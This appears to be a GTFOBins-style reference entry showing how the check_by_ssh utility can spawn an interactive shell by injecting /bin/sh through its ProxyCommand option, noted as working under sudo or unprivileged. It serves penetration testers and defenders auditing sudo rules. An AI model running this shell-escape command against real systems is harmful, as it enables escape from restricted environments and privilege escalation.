---
type: gtfobin
name: check_by_ssh
platform: Unix
functions: [shell]
tags: [gtfobin, unix, lotl]
---

# check_by_ssh

## shell

```bash
check_by_ssh -o "ProxyCommand /bin/sh -i <$(tty) |& tee $(tty)" -H localhost -C x
```
_The shell will only last 10 seconds._
**Contexts:** sudo, unprivileged
